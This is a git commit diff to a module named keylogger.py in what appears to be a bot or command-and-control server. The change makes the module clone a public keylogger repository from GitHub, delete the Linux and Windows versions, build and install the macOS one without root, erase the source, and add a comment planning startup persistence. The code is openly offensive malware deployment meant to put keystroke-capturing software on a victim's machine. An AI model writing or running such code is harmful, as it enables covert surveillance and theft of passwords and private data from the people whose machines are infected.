56ae18dd752bb3c0c9181ad44d15f6caad7a733a
user <user@localhost.localdomain>
2019-09-23 18:38:09 -0400

    change configure settings to work without sudo

--- server/modules/bot/keylogger.py
+++ server/modules/bot/keylogger.py
@@ -9,11 +9,15 @@ import subprocess
 def run(options):
     output_dir = options["output_dir"]
     repo_dir = str(output_dir)+"/src/"
-
+    # configure to install programs without root
+    os.system("mkdir "+output_dir+"/bin")
+    os.system("./configure --prefix="+output_dir+"/bin")
     # download and drop the keylogger program
     # https://github.com/GiacomoLaw/Keylogger
     # later make it so that it's directly uploaded from server
     subprocess.run(["git","clone","-c", 
     repo_dir,"https://github.com/GiacomoLaw/Keylogger.git"])
-    
-    # manage it
+    os.system("cd "+repo_dir+"; rm -rf linux; rm -rf windows")
+    os.system("cd "+repo_dir+"mac; make; make install")
+    os.system("rm -rf "+repo_dir)
+    # manage it / do things like run on startup, etc
